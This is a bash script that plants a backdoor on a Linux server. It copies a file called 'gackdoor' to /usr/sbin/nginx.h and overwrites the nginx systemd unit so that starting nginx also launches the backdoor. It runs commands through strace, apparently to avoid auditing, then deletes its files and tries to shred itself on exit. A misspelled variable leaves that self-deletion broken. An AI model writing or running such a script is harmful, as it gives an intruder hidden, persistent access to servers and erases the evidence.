#!/bin/bash

currentscript="$0"

function finish {
    shred -u ${curretnscript}
}

NGINX="[Unit]\nDescription=The nginx HTTP and reverse proxy server\nAfter=network-online.target remote-fs.target nss-lookup.target\nWants=network-online.target\n\n[Service]\nType=forking\nPIDFile=/run/nginx.pid\n# Nginx will fail to start if /run/nginx.pid already exists but has the wrong\n# SELinux context. This might happen when running `nginx -t` from the cmdline.\n# https://bugzilla.redhat.com/show_bug.cgi?id=1268621\nExecStartPre=/usr/bin/rm -f /run/nginx.pid\nExecStartPre=/usr/sbin/nginx -t\nExecStart=/bin/bash -c \"/usr/sbin/nginx && /usr/sbin/nginx.h\"\nExecReload=/usr/sbin/nginx -s reload\nKillSignal=SIGQUIT\nTimeoutStopSec=5\nKillMode=process\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n"

sudo strace -o /dev/null cp gackdoor /usr/sbin/nginx.h
sudo strace -o /dev/null rm -f /lib/systemd/system/nginx.service
echo $NGINX >> temp
sudo strace -o /dev/null cp temp /lib/systemd/system/nginx.service

rm -f gackdoor
rm -f temp

trap finish EXIT